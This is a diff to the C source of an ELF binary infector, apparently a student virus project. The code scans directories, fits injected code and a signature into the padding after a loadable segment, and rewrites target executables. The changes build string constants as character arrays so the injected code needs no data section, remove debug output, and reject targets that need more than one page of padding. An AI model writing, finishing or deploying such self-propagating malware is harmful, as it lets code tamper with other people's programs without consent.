@@ -2,14 +2,25 @@
 
 void	infect(void)
 {
-	infect_dir("/tmp/test");
-	infect_dir("/tmp/test2");
+	char name[10] = {'i','n','f','e','c','t','(',')','\n','\0'};
+	ft_putstr(name);
+
+	char *dir[] = {
+		(char[10]){'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '\0'},
+		(char[11]){'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '2', '\0'}
+	};
+	for (int i = 0; i < 2; i++)
+		infect_dir(dir[i]);
 }
 
-void	infect_dir(char *path)
+void	infect_dir(const char *path)
 {
+	char name[14] = {'i','n','f','e','c','t', '_', 'd', 'i', 'r', '(',')','\n','\0'};
+	ft_putstr(name);
+
 	int		fd;
 
+	ft_putstr(path);
 	fd =  syscall_open(path, O_RDONLY | O_DIRECTORY);
 	if (fd > 0)
 	{
@@ -123,18 +134,14 @@ int			infect_fd(int fd, t_elf *elf)
 	int		size_needed = INJECT_SIZE + ft_strlen(SIGNATURE) + ((intptr_t)_start - (intptr_t)infect);
 	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
 	int		n_page_size = ((size_needed - previous_padding) / PAGE_SIZE) + 1;
-	ft_putstr("size_needed: ");
-	ft_putnbr(size_needed);
-	ft_putstr("\n");
-	ft_putstr("prev_padding: ");
-	ft_putnbr(previous_padding);
-	ft_putstr("\n");
+	if (n_page_size > 1)
+	{
+		syscall_munmap(elf->addr, elf->size);
+		return (TOO_BIG);
+	}
 	int		nb_zero_to_add = n_page_size * PAGE_SIZE - (size_needed - previous_padding);
 	if (nb_zero_to_add > 4096)
 		nb_zero_to_add = previous_padding - size_needed;
-	ft_putstr("nb_zero to add ");
-	ft_putnbr(nb_zero_to_add);
-	ft_putstr("\n");
 	char	*new;
 
 	new = syscall_mmap(NULL, elf->size + size_needed + nb_zero_to_add - previous_padding, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
@@ -210,7 +217,8 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
 	/* DONE IN ADD_PADDING_SEGMENTS
 	ft_memcpy(dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
 	e_shoff = elf->header->e_shoff + ; */
-	src = add_padding_segments(elf, src, &dst);
+	src = update_segment_sz(src, &dst, elf->pt_load);
+//	src = add_padding_segments(elf, src, &dst);
 	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
 	ft_memcpy(dst, src, pt_load_size_left);
 	dst += pt_load_size_left;
@@ -227,7 +235,7 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
 	Elf64_Phdr	*next = elf->pt_load + 1;
 
 	src = elf->addr + next->p_offset;
-	src = add_padding_sections(elf, src, &dst);
+//	src = add_padding_sections(elf, src, &dst);
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 	dst += (unsigned long)end - (unsigned long)src;
 }
